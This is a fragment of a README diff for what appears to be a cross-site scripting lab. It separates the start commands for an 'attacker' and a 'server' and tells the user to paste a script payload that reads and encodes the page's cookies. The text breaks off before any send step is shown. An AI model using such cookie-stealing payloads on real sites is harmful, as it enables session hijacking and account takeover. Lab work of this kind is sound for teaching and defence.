@@ -1,5 +1,5 @@
 First of all, try to install node_modules: npm install
-Then run attacker and server: npm start
+Then run attacker and server: node attacker.js, node server.js
 Paste payload in server input field: 
 <script>
   const cookies = encodeURIComponent(document.cookie);
